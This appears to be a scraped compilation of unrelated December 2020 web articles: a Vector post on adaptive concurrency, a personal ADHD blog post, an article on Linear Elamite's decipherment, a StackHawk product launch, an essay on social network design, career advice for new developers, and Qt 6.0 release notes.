pretty epic back and forth within our engineering team along with a slew of visualizations. It's quite the read.</li><li>As Netflix is largely a Java shop and there was nothing immediately usable "off the shelf" in the Rust ecosystem, we needed to create our own Rust implementation, which you can see in the <a href="https://github.com/timberio/vector/tree/master/src/sinks/util/adaptive_concurrency">adaptive_concurrency</a> module. Of special importance is the concurrency <a href="https://github.com/timberio/vector/blob/master/src/sinks/util/adaptive_concurrency/controller.rs#L23-L31">Controller</a>, which is responsible for the linear up/exponential down decision that I alluded to above.</li><li>For testing, the team mostly relied on our in-house <a href="https://github.com/timberio/http_test_server">http_test_server</a>, a pretty straightforward but highly customizable HTTP server written in Go.</li></ul><p>It took several months, some hefty PRs, and even a handful of <a href="https://github.com/timberio/vector/pull/3671">dead ends</a>, but we think that both the process and the end result are wholly consistent with the fastidious approach we strive for in building Vector.</p><h2>More to come</h2><p>Next week, we'll follow up on this announcement with a post from Timber's <a href="https://github.com/bruceg">Bruce Guenter</a>…</p></section></div>

<p><a href="https://twitter.com/hypatiadotca/status/1020811574519332865">A year and a bit ago I got diagnosed with ADHD, moderate severity, inattentive type.</a> I’ve been meaning to write a bit about what I’ve learned since then but I keep, you know, getting distracted. It came up in a Slack conversation today which resulted in me barfing 500 words into a relative stranger’s DMs and then I was hyper and couldn’t sleep so now you get a blog post. Squirrel!</p>



<h2>Experts</h2>



<p>I have accepted at this point that I need to work with experts to be an effective/productive/sustainable human. I’m fortunate to have the resources to do so, and I recognize that that’s a privilege. Working with experts is a power-up that lets me be more effective in doing good in the world. Currently, this is my roster of experts, with a rough cadence of how often we work together:</p>



<ul><li>trauma-focused psychotherapist (weekly. I’ve been through Some Shit in the past couple years and I keep wanting to go less than weekly but then reality kicks my ass and I keep going weekly)</li><li>ADHD coach (monthlyish)</li><li>psychiatrist (~2-3 months for med management)</li><li>personal trainer (twice weekly-ish)</li><li>professional organizer (couple times per year + more around moving)</li></ul>



<p>I wanted to expand on the professional organizer bit and share a resource that’s helped me an absolute TON: “<a href="https://amzn.to/2ZJAm5y">Organizing Solutions for People with ADHD</a>“.* There’s an existing Twitter thread so I won’t summarize it much much except: your inventory must not exceed your space. Less inventory = easier organizing.</p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">I’m reading a book called “Organizing Solutions for People with ADHD” and really enjoying it so far, so I’m gonna tweet some things as I read it! <a href="https://t.co/SK4lA8BRtA">pic.twitter.com/SK4lA8BRtA</a></p>— Leigh Honeywell (@hypatiadotca) <a href="https://twitter.com/hypatiadotca/status/1132392483378229249?ref_src=twsrc%5Etfw">May 25, 2019</a></blockquote></div>
</div></figure>



<p>The pro organizer I’ve been working with in person specializes in working with folks with ADHD. If you’re in San Francisco and want to see if working with a pro can help make your space more sane, functional, and sustainable, give <a href="http://liberatedspaces.com/">Debra</a> a ping. I’ve also previously worked with <a href="https://simplifyexperts.com/">Denise</a> up in Seattle, if you’re looking for an organizer up there. </p>



<h2>Tactics </h2>



<p><strong>Pairing</strong> is the biggest one. I get sooooo much done when I’m working with someone else. This is a known thing with ADHD – it’s called “<a href="https://add.org/the-body-double/">body doubling</a>“. One of my poor colleagues sometimes just sits with me while I whine about emails I’m writing (as I’m writing them). I’m grateful for every minute of her time even though I know it’s kinda a boring thing to do.</p>



<p><strong>Rigorous calendaring</strong> – I do a lot of magical thinking about time and how much I can get done in it, so blocking things off on my calendar a LOT, like to a point it feels silly, has helped. I block off travel time, email time,<strong> </strong>recovery time after social things, etc. Also – I put a clock on my desk. “Clocks are like glasses for the time-blind” is a thing that stuck with me from this year! Also also: I know I’m best in the mornings, so I block of time for creative/thinky things then and take calls in the afternoons. Or early mornings, FML.  </p>



<div><p><strong>Getting enough sleep</strong> (which I’m failing at right now!!) helps me with executive function (which means: which tasks to do and also starting them; it’s the main thing people with ADHD don’t have enough of), working memory, general emotional evenkeeledness.</p><p><strong>Exercise</strong> – days when I have lifted heavy things and put them back down repeatedly in the morning are so much more productive than days I haven’t, unless I fuck up the sleep thing and then sometimes I fall asleep at my desk. That’s why sleep is before exercise on this list.</p></div>



<div><p><strong>Self-compassion</strong> – my productivity isn’t smooth <em>and that’s ok</em>. It’s not a moral flaw that my brain doesn’t really have much of a “chill getting shit done” mode in between “fucking around” and “SUPERHUMAN INCIDENT RESPONDER ADRENAL CRISIS MODE”. It’s just how my brain works. I’m working hard on building that middle mode – it’s like a muscle! But after a couple decades of white knuckling it through the other modes, it’s gonna take some time to shed maladaptive habits and build more sustainable ones.</p><p>There’s no point being cruel to myself when I get a bit stuck in “fucking around” mode and get dribs and drabs of work done as I alternate between work email reddit twitter a cute dog video someone sent me personal email DMs work Slack personal Slack phone messages work email etc etc. Harshness doesn’t get me any closer to chill getting shit done mode.</p></div>



<p><a href="https://self-compassion.org/">Kristin Neff’s work</a> and <a href="https://amzn.to/2NQbo27">book</a> is a good place to start if that last bit resonated with you.</p>



<h2>Drugs</h2>



<p>I take 2mg Intunive XR (guanfacine) every night at bedtime, and 5mg Adderall XR on workdays. Intunive – originally a blood pressure drug that some genius figured out helps folks with ADHD – stops my brain from yelling “YOU’RE A FAILURE AND A DISAPPOINTMENT TO EVERYONE YOU LOVE” constantly. This is known as “<a href="https://www.additudemag.com/rejection-sensitive-dysphoria-and-adhd/">rejection-sensitive dysphoria</a>” or RSD, and it is the trauma response many people get from a lifetime of ADHD getting in the way of being able to consistently get stuff done (and then getting yelled at for being a failure, losing jobs, etc.) Adderall does what everyone knows Adderall does: lets me focus on stupid mundane shit. I find that it doesn’t help me as much with bigger creative things – it doesn’t harm, but it really shines on stuff like getting expenses filed. I take a low dose of it – too much makes me anxious.</p>



<h2>Where I’m at</h2>



<p>I still feel like I’m at maybe 60% of where my self-image says I should be productivity-wise, but it was like 30% before so it’s a huge improvement. ~Not living up to my potential~ is the millstone around the necks of just about everyone with ADHD (see earlier explanation of RSD), though, so I try to be gentle with myself when I stare at a wall for 4 hours in an evening because I can’t focus, and then have to stay up til 3AM to get that deliverable out. And then I’m super wired, so I write most of a blog post.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_83_933">

<div><p><strong>Linear Elamite</strong> is the oldest pure phonetic writing system known to history (i.e.completely without any logogrammatic notation). It was deciphered by French researcher, <strong>François Desset</strong>, who is currently a visiting professor at the University of Padua. The announcement, which was made in 2020 with the first presentation taking place on 23 November, was preceded by several events leading up to this great accomplishment. In 2018,<a href="https://www.tandfonline.com/doi/abs/10.1080/05786967.2018.1471861" target="_blank" rel="noopener noreferrer"> a scientific article </a>was published that analysed nine silver <em>Gunagi</em> vessels with inscriptions in Linear Elamite (Desset, 2018). In this video, Desset, a 38-year old that proudly calls himself an orientalist due to his multidisciplinary approach, which takes into account history, archaeology and philology, provides us with a ‘how-to guide’ that demonstrates how to decipher Linear Elamite script.</p>
<p>We are aware of how unusual a ‘how-to guide’ of this nature may sound; however, this is the first time we are given a sneak preview of the process of how an inscription in Linear Elamite is deciphered. This inscription will just account for one of the 40 that will make up the key scientific article that will be <strong>published in 2021</strong>, after all of the necessary proofreading and peer reviewing processes have been concluded. It is important to remember that, while this is only just a preview of what will be discussed in a long interview that will be available in the next few days on ArchaeoReporter, we are dealing with the deciphering of a <strong>writing system</strong> and not of a <strong>language</strong>. This<strong> Linear Elamite writing system was recording Elamite language, a non-Indo-European</strong> language that has been completely <strong>isolated</strong> over the course of history and <strong>requires much more extensive research</strong>. It is true that we were already able to partially understand it thanks to cuneiform scripts, which were used in Mesopotamia. Here, however, we are very far away, in <strong>southern Iran</strong>, in a time period around <strong>2300 – 1900 BCE</strong>, therefore we can analyse the story from a point of view that greatly differs from that of their contemporary Mesopotamian plain-dweller neighbours.</p>

<p>Today we are excited to announce the launch of StackHawk’s free Developer Plan. With this launch, engineering teams or individual developers can take ownership of security in the development and delivery of their applications. Read on to learn a bit more about why we are so excited to launch this, or jump right in to <a href="https://auth.stackhawk.com/signup">sign up for a free account</a>.</p>



<h3 id="h-application-security-s-new-paradigm">Application Security’s New Paradigm</h3>



<p>It is no secret that the speed of application delivery has rapidly accelerated over the past decade. Most companies are pushing to production several times per week, or even multiple times per day. Originally, security struggled to keep up, with the dated models of quarterly penetration tests or manual scans by security teams clearly <a href="https://www.stackhawk.com/blog/application-security-is-broken/">no longer cutting it</a>.</p>



<p>These legacy models were predicated on finding vulnerabilities in production, often awhile after code had been deployed. This is at best, inefficient, and at worst a security issue. Once a vulnerability was found, it then had to navigate internal silos to actually get a fix released.</p>



<p>Modern engineering teams, however, have not only accelerated delivery speed, but have also improved security in the process. Here is how.</p>



<h4 id="h-find-vulnerabilities-with-ci-cd-automation">Find Vulnerabilities with CI/CD Automation</h4>



<p>Companies using modern approaches check for security vulnerabilities on every pull request (or even every commit) in the same way that they run unit tests and integration tests. With automated testing in CI/CD, developers can catch vulnerabilities early in the software development lifecycle, and fix issues while they are still in the context of the code.</p>



<p>After an initial triage of any existing security bugs, application security tooling should at least be configured to break the build if any new high criticality vulnerabilities are identified. This doesn’t mean that every vulnerability should prevent a deploy to production, but that deploy should be done eyes wide open to the risk it presents.</p>



<h4 id="h-triage-and-initial-risk-decisions-live-with-developers">Triage and Initial Risk Decisions Live with Developers</h4>



<p>When a vulnerability is found, the developer(s) who were recently working on the application are best equipped to review the finding and make risk-based decisions. Should this block the deploy to production? Can this be added to a backlog and addressed later? Is this low enough risk that it isn’t worth fixing?</p>



<p>The individuals who are intimately involved in creating the application are best equipped as the first-line of defense for these decisions. Internal security teams are undoubtedly called upon for clarification and support (…and are often reviewing historical decisions as well), but modern teams are empowering developers to make these triage decisions themselves.</p>



<h4 id="h-fast-developer-fixes">Fast Developer Fixes</h4>



<p>When a security bug requires a fix, the responsibility for the fix squarely lives with the developer who introduced the vulnerability in modern teams. This individual is in the codebase, familiar with the context of the recent vulnerability addition. Not only are they best equipped to implement the fix, but by democratizing this responsibility across the team, no person or team bears the burden of interrupt driven work.</p>



<h3 id="h-taking-ownership-of-application-security">Taking Ownership of Application Security</h3>



<p>Ever since we embarked upon building StackHawk, we have been laser focused on building a tool for developers. The market is rife with security tools built for the CISO that no developer wants to use, and these tools typically start at six-figure contracts. StackHawk is different, and we are excited to equip engineers to own the security of their application. This shows up in our product, and with our new free Developer Plan, it also shows up in our pricing.</p>



<p>Now individuals or teams can start running application security tests against their first application for free. There is no longer an excuse not to be looking at the security of your application.&nbsp;</p>



<p>Getting started with StackHawk is easy, with most developers completing their first security test in under 20 minutes. You can get the full details in <a href="https://docs.stackhawk.com/">our docs</a>, but in short it is as simple as building a yaml config, pointing the scanner at your application, and taking a look at the results.&nbsp;<br><a href="https://auth.stackhawk.com/signup">Sign up</a> for a free account and give it a try today!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/Article"><header><p>December 05, 2020</p></header><section itemprop="articleBody"><h2>Introduction</h2>
<p>The harmful effects of the algorithms employed by social networking platforms like Twitter and Facebook has been well documented: polarisation, privacy issues, you name it. Even though I share a lot of these concerns between all the petty tribalism there is potential for having deep and meaningful conversations too. But I do not think it is possible to improve existing social networks, as even though these networks are not inherently evil they are a result of a bad business model. Their main objective is maximising user engagement the more time you spend glued to your screen the better. With this model at the core it is hard for these companies to implement change. In certain cases taking initiatives for improving the mental well being of users or for promoting productive discourse might be impractical too. The quality of the experience is secondary to the screen time.</p>
<p>The solution in my opinion is to build networks with strong core values that promote productive conversations. Start with a small community with a solid foundation then gradually expand keeping the values intact. What would such a network look like? Well like anything great it will have to take what is good about its predecessors and improve on their shortcomings. The improvements should be significant so as to provide a reason for people to actually switch. But improvements is a vague term to see how social networks can be improved I think it is better to analyse and think about the components that make up these networks from first principles.</p>
<h2>Moderation</h2>
<p>If we have learned anything from <a href="https://www.pbs.org/newshour/nation/right-wing-users-flock-to-parler-as-social-media-giants-rein-in-misinformation">Parler</a> it is that sometimes it becomes necessary to infringe upon people’s free speech rights especially when these privileges come at the cost of civilised discourse. Still banning people is a slippery slope for example if you ban a terrorist account then what do you do when China asks you to ban accounts of Hong Kong protesters? You have given them the precedent. I think the solution is to have strict moderation but with strong foundational principles and make them clear early on. A good strategy is to only censor people if they are disrespecting other people not when they are expressing their opinions or ideas. Even if you think that the earth is not flat you should let other people talk it out if they are being civil about it.</p>
<p>If you look at communities like <a href="https://news.ycombinator.com/">Hacker News</a>, <a href="https://stackoverflow.com/">Stack Overflow</a>, or the <a href="https://www.reddit.com/r/AskHistorians/">Ask Historians subreddit</a> where the moderators rule with an iron hand you can notice that the posts and comments in these forums are of much higher quality. But still it is anecdotal evidence and these communities are small when you compare them to giants like Facebook and Twitter. Also how would you moderate millions of post? Even if it was possible for human to do it can you rely on them to look at these posts objectively and report them only if they violate the guidelines? I believe if you start a community with strong core values it is possible to motivate people with a little bit of algorithm ingenuity to act in good faith.</p>
<h2>Feed</h2>
<p>Feeds and Algorithms are inextricably linked, feeds serve content curated by algorithms. Feeds can be finite or infinite providing an endless stream of posts and the algorithms used by these can range from simple algorithms that serve posts in chronological order to relatively complex machine learning based recommender systems. Most of the big platforms nowadays use recommender systems coupled with infinite feeds. It can get really messy if a single feed is used to serve both recommended content and the content that the user is subscribed to. YouTube is a good example of this even though they have great recommendations the content that the user has actually subscribed to gets lost in the feed of recommended videos. You might argue that they have a different feed for subscriptions but its not the one they show first when the user enters their app/website and that is the one that actually counts.</p>
<p>For our ideal social network I think it will be better to use two different feed one main finite feed solely for the subscribed/followed content and one infinite feed that recommends content based on the the interests of the user. For the subscription feed I do not think a purely chronological algorithm will work as a post about an important event like a friend’s birthday might get trapped between relatively trivial posts but between the posts of similar importance chronological information can be taken into account. A more complex algorithm will be required for the recommendation feed I will talk about it more in the monetisation section. The goal of the feeds should be to maximise signal from noise and not waste the time of its users.</p>
<h2>Monetisation</h2>
<p>Advertising is a bad and unsustainable business model for social networks, if your main source of revenue are advertisements you will be incentivised to increase user engagement and sometimes even at the cost of the actual experience. The best business model for social networks I think is the Wikipedia model. Ask people who can afford to to pay a nominal subscription to keep the servers running. The success of the company will actually depend how happy its users are with the platform.</p>
<p>You might have noticed that I have used vague terms like ‘algorithmic ingenuity’ and statements like ‘build a system that recommends people posts based on their interests’ without mentioning the specifics of the algorithm that is because I do not know and when it comes to moderation algorithms neither does Twitter. Learning based algorithms are not completely transparent and it is difficult to predict what they are going to do and it becomes even more difficult to come up with good algorithms when the goals of the networks are misaligned with the public good. What my argument is that in social networks that do not depend on advertising money engineers will be actually motivated to come up with better algorithms for moderation and recommendation.</p>
<h2>Interface and Posts</h2>
<p>The whole social network revolves around posts these are the primary content that people use to interact with their subscribers/followers. For Twitter these are limited length messages, for Quora these are questions, for Instagram images, for YouTube videos, etc. The format of these posts is important. They can be designed such that people come up with clever ways to use them (example tweets) and they can also be designed in a more restrictive way such that people struggle to get across what they mean (example tweets).</p>
<p>The ideal post in my opinion is a mixture of these two we could allow people to post both a restricted length post and a full fledged article but nothing in between this leaves space for creativity and does not hamper conversation. An option could be given to the users to sort their feed by articles, shorter posts or both. And instead of like and dislike buttons we can use recommend and not recommend buttons the functions might be same but change in name might help people make conscious decision about whether they want similar content recommended to them or not.</p>
<p>Another way we can improve conversations I think is by giving people a small break between writing a post and actually posting it. This might seem counter-intuitive but I think if given a chance to reflect on things people generally take right decisions and it can also give them time to calm down so that they do not engage in pointless name calling. We can implement it by an optional 15 seconds timer which is enabled by default.</p>
<h2>Conclusion</h2>
<p>The goal of the post is to start a conversation about what an ideal social network might look like. But these are just abstract ideas and musings there is no evidence a social networks like this will be successful but instead of conjecturing about whether things will work or not it is better to try to implement it and see for yourself. In that spirit I am going to try to implement a social network based on these principles. But I am a lone programmer and I need help if some part of my post resonated with you and you think that implementing such a network is worth a try contact me at <a href="mailto:dubeyaayush08@gmail.com">dubeyaayush08@gmail.com</a> and maybe we could team up.</p></section><hr></article></div>]]>

<p><em>This is a guest post from Karl Hughes. Enjoy.</em></p>



<p>Dear new developer,</p>



<p>I was in your shoes in 2011. I was finishing up a degree in mechanical engineering that I would never use and looking for a way to join a startup as a software developer.</p>



<p>Maybe it was the entrepreneur in me, and maybe it was just naivety, but instead of applying for jobs, I decided to start emailing interesting companies instead. I made a list of technology startups in the education industry and emailed each of them my pitch.</p>



<p>Two of them got back to me and one (<a href="https://www.uloop.com/">Uloop</a>) had an office three hours away in Nashville. I drove to meet their CEO and after a few conversations, they brought me on as a freelancer. When I graduated a few months later, they offered me a full-time role managing their blog and writing custom WordPress plugins.</p>



<p>Since then, I’ve worked at three different edtech startups and never once had a formal “job interview.” Every company I’ve worked for has hired me because I met someone there and stayed in touch for months. When a job opened up, they reached out to me to see if I was interested.</p>



<p>My first job hunt showed me that your strength as a software developer is not in your resume, your knowledge of algorithms, your ability to keep up with the hottest frameworks, or even your problem-solving skills. <strong>The most powerful tool you have is your network.</strong></p>



<h2>The Employer’s Perspective</h2>



<p>As a job-seeker, you know that looking for a job is scary, but from an employer’s perspective, hiring is scary too.</p>



<p>After sitting in the hiring manager’s seat several times in the past few years, I can tell you that I’m as scared of hiring the wrong person as you are of screwing up the job interview. If I make a bad hire, I look bad to my boss, and my team’s productivity will suffer. Having to fire someone kills morale and hurts the manager’s reputation, so nobody wants to do it.</p>



<p>This fear is why managers look for people in their networks or work with recruiters. <strong>The very last place employers look for applicants is the cold resume bin.</strong></p>



<h2>How I Built My Network</h2>



<p>If you want to avoid the black hole of submitting your resume online, you need to build a network. I don’t know you well enough to give you a perfect formula for your situation, so I’ll just tell you how I built my network. I hope some of these ideas resonate.</p>



<p>First, I started as a freelancer before I ever had a “real” job as a programmer. Most people don’t recommend this approach for new developers, but it forced me to learn to “sell” myself really well. When I started with Uloop, I often had no idea how to accomplish a task, but I bet that I could learn it before they discovered I was making it up.</p>



<p>After getting that first job, I started attending meetups and conferences regularly. Uloop was a small company, so there wasn’t much opportunity to network within the organization, but I had moved to Chicago, where there were plenty of programming meetups and tech events to attend.</p>



<p>I tried meeting people at these events, but it was hard. I’m not that outgoing, so instead, I would email the event’s speaker or organizer afterward and invite them to a one-on-one coffee or lunch. Some of the people I met like this are among my closest mentors and friends today.</p>



<p>As I attended more meetups and got to know speakers and leaders, people started inviting me to give back. I was little more than a junior developer at the time, but I was asked to speak at bootcamps, meetups, and even a couple of small conferences because of my network.</p>



<p>Naturally, I was nervous the first few times I got up in front of a group to share my experience. I knew there were people in the crowd with decades of experience on me, and I expected them to stand up and call me out if I made any mistakes. I found that practice and gradually increasing the stakes helped me. By trying a talk out at a local meetup and slowly working up to larger audiences at a conference, I gained confidence over time.</p>



<p>Giving a talk at a meetup or conference is a lot of work, and you don’t typically get paid for it. That said, I knew how helpful it was hearing developers who were more experienced than me back when I was first learning to code, so I have always enjoyed the opportunity to give back.</p>



<p>One side effect of speaking is that you get even more opportunities to increase your network. At some point, I switched from being the one asking speakers to meet with me to the one that attendees were asking to speak with. I always enjoy these interactions with new developers, and the opportunity to encourage or help others is my primary motivation for speaking and writing this letter.</p>



<h2>Keeping in Touch</h2>



<p>Everyone who talks about networking tells you to go out and meet more people, but that’s <a href="https://www.karllhughes.com/posts/the-key-to-networking-keeping-in-touch">worthless if you don’t keep in touch with anyone</a>. As I started to meet more people in Chicago, I realized that I needed to come up with a way to have more encounters with each of them.</p>



<blockquote><p>“It takes on average about 3 encounters — and by that I mean intentional rather than passing interactions where you’ve gotten together primarily to just hang out — to really see if there’s potential for a relationship with someone.” – <a href="https://www.artofmanliness.com/articles/the-3-encounter-rule/">Brett McKay</a></p></blockquote>



<p>The first step was to start a spreadsheet of people I wanted to keep up with. Most of them were more experienced than me, but many were peers or newer developers I “clicked” with or found interesting.</p>



<p>Next, I made a reminder to reach out to 1-2 people on the list every week. I’d ask how they were doing and see if they wanted to get lunch or coffee sometime. I tried to find organic reasons to connect (birthdays, an article related to their industry, etc.) and ask them questions about their lives. One of the easiest ways to make someone like you is to get them talking about something they like. <a href="https://www.psychologytoday.com/us/blog/positive-prescription/201703/why-we-love-talking-about-ourselves">People love talking about themselves</a>.</p>



<p>While this sounds calculated, I do genuinely enjoy these conversations. We’re all busy, but having a system like this ensures that I don’t forget to maintain my network. If I ever feel like I’m no longer getting along with someone, I remove them from my list and no harm is done.</p>



<p>The reason most people don’t do this is that it takes a lot of time. I still spend 4-6 hours per week keeping in touch with or expanding my network. It may seem like a lot, but the investment has paid dividends and afforded me many interesting conversations and relationships along the way. This strategy of intentionally staying in touch with people has led to friendships, co-workers, job offers, and clients.</p>



<h2>Make It Yours</h2>



<p>No career advice will work for everyone.</p>



<p>I didn’t write this letter to give you a formula for networking, but rather to let you know that unconventional approaches can work. My network has been an invaluable asset, but luck and privilege played a huge part too.</p>



<p>If I hadn’t been able to drive three hours to take a meeting with my future boss, would he have hired me? If I needed to be home after work to help care for a family member, would I have been able to network at Meetups? If I weren’t a white male in an industry dominated by white males, would people have taken the time to meet with me?</p>



<p>I don’t know.</p>



<p>I have no idea what your career path will look like, but I hope my story gives you the courage to build a path that works for you.</p>

                      <p>The delivery of mouse and touch events in Qt Quick is complex, and it became clear a few years ago that we needed to refactor the event inheritance hierarchy, to have some common API for various event types, so that more of the delivery code could be shared. In Qt 5.8 we added QQuickPointerEvent and associated types, as a way of prototyping what that could look like. They are QObjects; and since then, QQuickWindow has been delivering these wrapper events that carry the original events inside. Now finally in Qt 6 we have been able to complete the QEvent refactoring, so that QQuickWindow no longer needs the wrappers. Along with that, we were able to add a few features and fix a few bugs. Many of the remaining bugs that seemed intractable in Qt 5 should at least be possible to fix later on.</p>

                      <h4>Porting from Qt 5 to Qt 6 using Qt5Compat library</h4>                  
                      <p>Porting from Qt 5 to Qt 6 has been intentionally kept easy. There has been a conscious effort throughout the development of Qt 6 to maintain as much source compatibility with Qt 5 as possible. Still, some effort is involved in porting. This short post summarizes some of the steps required when porting to Qt 6.</p>

                      <h4>Desktop styling with Qt Quick Controls</h4>                  
                      <p>Qt Quick Controls 1 was our first UI framework for QML. The controls were mostly written in QML without much C++. At the time, QML was still a new technology, which meant that we didn’t have enough experience with designing for performance to know what to expect. So the styling API ended up inefficient by design, with many fat delegates that used extensive amounts of JavaScript, bindings, introspection, Loaders, and QObjects for both control logic and styling. It also had a linking dependency to Qt Widgets to get native styling and Widget-based dialogs. And without the QML compiler that we have today, this all ended up as a rather slow and messy approach. When we realized that it also didn’t perform well on embedded hardware, it was time to rethink the solution. And the result was Qt Quick Controls 2.</p>

                                Tuesday December 08, 2020 by <a href="https://www.qt.io/blog/author/lars-knoll">Lars Knoll</a> | <a href="#commento">Comments</a>

                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><span>I am really excited to announce today’s release of Qt 6.0. It is the first release of a new major version, and marks a major milestone for Qt. </span><strong><em>We started working on the initial ideas a few years ago, and since then, have put a massive effort into creating the next generation of Qt. </em></strong></p>

<p><a href="https://www.qt.io/product/qt6/" rel="noopener" target="_blank"><span><img src="https://www.qt.io/hubfs/Qt%206%20email%20launch%20hero%201-png-1.png" alt="Qt 6"></span></a></p>

<p><span>Qt 5 has been a fantastic success over the years, and we have seen an enormous growth of our user base and Qt usage over eight years since we released Qt 5.0. But the world&nbsp; has undergone significant changes since 2012. Qt usage in embedded systems has skyrocketed, C++ has evolved, and new 3D graphics APIs have emerged. These are examples of factors that have directly affected Qt.</span></p>
<p><span>As a cross-platform framework, Qt needs to adjust to those changing requirements. We have managed to adapt very well to many of those requirements during the lifetime of Qt 5. However, maintaining full source and binary compatibility within the Qt 5 series made certain things impossible to fix within its lifetime. With Qt 6, we now have the opportunity to make changes and build Qt to be better suited for the years to come.</span><span></span></p>
<div>
<p>Thus, the mission of Qt 6 is to enable Qt to be the productivity platform for the future. Qt 6.0, as a major release of Qt, gave us a higher degree of freedom to implement new features, functionality, and better support today and tomorrow's requirements. Qt 6.0 is a continuation of the Qt 5 series, and we have focused on making migration non-disruptive for users. I published a <a href="https://www.qt.io/blog/2019/08/07/technical-vision-qt-6" rel="noopener">Qt 6 vision blog post</a> capturing those ideas around 18 months ago.</p>
<p>When creating Qt 6, we ensured that Qt’s core values have been adhered to and upheld, including:</p>
<ul>
<li>Its cross-platform nature, allowing users to deploy their applications to all desktop, mobile, and embedded platforms using one technology and from a single codebase</li>
<li>Its scalability from low-end, single-purpose devices to high-end complex desktop applications or connected system</li>
<li>Its world-class APIs and tools and <a href="https://doc.qt.io/" rel="noopener">documentation</a>, simplifying the creation of applications and devices</li>
<li>Its maintainability, stability, and compatibility, allowing users to maintain large codebases with minimal effort</li>
<li>Its large developer ecosystem with more than 1.5 million users</li>
</ul>
<p>Qt 6.0 is the first release of the Qt 6 series addressing new market demands while keeping the core values at the heart of what we do.</p>
<p>When developing Qt 6, we had an in-depth look at some of Qt's most central parts to identify how we could improve them. We discovered a couple of core focus areas that we invested considerable time in improving. Those areas include:</p>
<div>
<ul>
<li>Leveraging C++17</li>
<li>Next generation QML</li>
<li>New graphics architecture</li>
<li>Unified 2D and 3D for Qt Quick</li>
<li>CMake build system (with qmake still supported for applications)</li>
</ul>
</div>
<p>We have of course also spent time doing numerous improvements in other areas, too many to mention them all here, and I suggest you look at the more detailed <span><span><a href="https://wiki.qt.io/New_Features_in_Qt_6.0" rel="noopener">wiki page</a>. We are also hosting Meet Qt 6.0 webinar sessions covering the <a href="https://www.qt.io/events/meet-qt-6-1607340244" rel="noopener">Americas/EMEIA</a> and <a href="https://www.qt.io/events/meet-qt-6-1607339968" rel="noopener">EMEIA/APAC</a> time zones. But let's take a look at some of the highlights.</span></span></p>
</div>
<h3><span>C++17</span></h3>
<p><span><img src="https://www.qt.io/hs-fs/hubfs/cpp_logo-png.png?width=168&amp;name=cpp_logo-png.png" width="168" alt="C++ 17 in Qt 6" srcset="https://www.qt.io/hs-fs/hubfs/cpp_logo-png.png?width=84&amp;name=cpp_logo-png.png 84w, https://www.qt.io/hs-fs/hubfs/cpp_logo-png.png?width=168&amp;name=cpp_logo-png.png 168w, https://www.qt.io/hs-fs/hubfs/cpp_logo-png.png?width=252&amp;name=cpp_logo-png.png 252w, https://www.qt.io/hs-fs/hubfs/cpp_logo-png.png?width=336&amp;name=cpp_logo-png.png 336w, https://www.qt.io/hs-fs/hubfs/cpp_logo-png.png?width=420&amp;name=cpp_logo-png.png 420w, https://www.qt.io/hs-fs/hubfs/cpp_logo-png.png?width=504&amp;name=cpp_logo-png.png 504w" sizes="(max-width: 168px) 100vw, 168px"></span></p>
<p><span>With Qt 6 we now require a C++17 compatible compiler enabling the use more modern C++ language constructs when developing Qt and also allows for integration points on the API side.</span></p>
<h3><span>Core libraries and APIs</span></h3>
<p><span>Much work has gone into Qt Core, as it is the module that implements the most central parts of Qt. We've gone through many areas there and made improvements. To name some of the most central ones:</span></p>
<ul>
<li><span>The new <a href="https://www.qt.io/blog/property-bindings-in-qt-6" rel="noopener">property and binding system</a>: This system now brings the concept of bindings that made QML such a huge success in Qt 5 available from C++. </span></li>
<li><span>Strings and Unicode: With Qt 5, we started aligning Qt fully with Unicode, where we completed a lot of the work, but a few items remained that we now cleaned up for Qt 6. More details will come in a separate blog post later on.</span></li>
<li><span>QList has been a class that was often criticized in Qt 5, as it was heap allocating objects stored in there that were larger than a pointer, leading to pressure on heap allocation methods. In Qt 6, we changed this and unified QList and QVector into one class. See our <a href="https://www.qt.io/blog/qlist-changes-in-qt-6" rel="noopener">blog post about QList</a> in Qt 6 for details.</span></li>
<li><span>QMetaType and QVariant are fundamental to how our Qt’s meta-object system works. Signals and slots would not be possible without QMetaType and QVariant is required for dynamic invocations. Those two classes got an almost complete rewrite with Qt 6, and you can read about the details <a href="https://www.qt.io/blog/whats-new-in-qmetatype-qvariant" rel="noopener">here</a>.</span></li>
</ul>
<p><span>Other parts of Qt that are not related to graphics have also seen large changes. For example, Qt Concurrent has undergone an almost complete rewrite and now makes development of multi-threaded applications more effortless than ever. Qt Network has seen lots of clean-up and improvements. See this <a href="https://www.qt.io/blog/qt-network-in-qt-6" rel="noopener">blog post</a> for details.</span></p>
<h3><span>New graphics architecture</span><span>&nbsp;</span><span></span></h3>
<p><span>The graphics architecture of Qt 5 was very much dependent on OpenGL as the underlying 3D graphics API. While this was the right approach in 2012 when we created Qt 5, the market around us has changed significantly over the last couple of years with the introduction of Metal and Vulkan. We now have a large set of different graphics APIs that are commonly being used on different platforms. For Qt as a cross-platform framework, this, of course, meant that we had to adjust to this and ensure our users can run Qt on all of them with </span>maximum performance.</p>
